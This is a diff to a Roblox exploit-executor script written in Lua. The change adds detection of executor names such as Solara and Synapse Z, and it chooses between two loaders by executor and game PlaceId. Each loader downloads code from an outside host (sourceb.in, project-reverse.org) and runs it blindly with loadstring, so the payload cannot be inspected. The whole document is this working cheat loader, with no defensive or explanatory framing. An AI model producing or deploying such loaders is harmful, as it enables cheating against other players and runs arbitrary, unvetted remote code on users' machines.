@@ -6,16 +6,36 @@ local allowedPlaceIds = {
     [80469437126309] = true
 }
 
+local forcedExecutors = {
+    ["Volt"] = true,
+    ["Solara"] = true,
+    ["Velocity"] = true,
+    ["Seliware"] = true,
+    ["Synapse Z"] = true,
+    ["Cosmic"] = true
+}
+
+local function getExecutor()
+    local executorName = (syn and syn.getexecutorname and syn.getexecutorname()) or
+                         (getexecutorname and getexecutorname()) or
+                         (identifyexecutor and identifyexecutor()) or
+                         "Unknown"
+    return executorName
+end
+
 local function firstScript()
     loadstring(game:HttpGet("https://cdn.sourceb.in/bins/rcNysOctBR/0", true))()
 end
 
 local function secondScript()
     loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjgxN2EyNjcyLTZhN2ItNDQ0MS05ZDc5LWE5NmRlMDZiY2JmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
-
 end
 
-if allowedPlaceIds[game.PlaceId] then
+local executor = getExecutor()
+
+if forcedExecutors[executor] then
+    task.spawn(firstScript)
+elseif allowedPlaceIds[game.PlaceId] then
     task.spawn(secondScript)
 else
     task.spawn(firstScript)
